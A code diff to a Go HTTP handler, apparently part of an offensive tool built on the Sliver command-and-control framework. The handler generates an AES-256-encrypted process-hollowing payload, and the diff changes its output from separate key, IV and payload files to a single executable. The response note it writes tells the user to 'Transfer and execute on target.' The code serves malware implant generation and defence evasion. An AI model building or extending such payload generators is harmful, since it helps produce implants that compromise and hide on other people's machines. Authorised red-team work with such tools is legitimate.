@@ -774,7 +774,7 @@ func hGenerateProcessHollow(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	executable, encrypted, key, iv, err := sliver.ProcessHollowPayload(opts)
+	executable, _, _, _, err := sliver.ProcessHollowPayload(opts)
 	if err != nil {
 		writeErr(w, err, 502)
 		return
@@ -785,40 +785,16 @@ func hGenerateProcessHollow(w http.ResponseWriter, r *http.Request) {
 		baseName = "payload"
 	}
 
-	// Save .exe
 	exePath, err := saveArtifact(dir, baseName+".exe", executable)
 	if err != nil {
 		writeErr(w, err, 400)
 		return
 	}
 
-	// Save key.bin
-	keyPath, err := saveArtifact(dir, baseName+"-key.bin", key)
-	if err != nil {
-		writeErr(w, err, 400)
-		return
-	}
-
-	// Save iv.bin
-	ivPath, err := saveArtifact(dir, baseName+"-iv.bin", iv)
-	if err != nil {
-		writeErr(w, err, 400)
-		return
-	}
-
-	// Save payload.bin
-	payloadPath, err := saveArtifact(dir, baseName+"-payload.bin", encrypted)
-	if err != nil {
-		writeErr(w, err, 400)
-		return
-	}
-
 	writeJSON(w, map[string]any{
-		"exe":     exePath,
-		"key":     keyPath,
-		"iv":      ivPath,
-		"payload": payloadPath,
-		"note":    "Process hollowing with AES-256. Keep all 3 files in same directory and execute the .exe",
+		"path": exePath,
+		"size": len(executable),
+		"note": "Single executable with embedded encrypted payload. Transfer and execute on target.",
 	})
 }
 
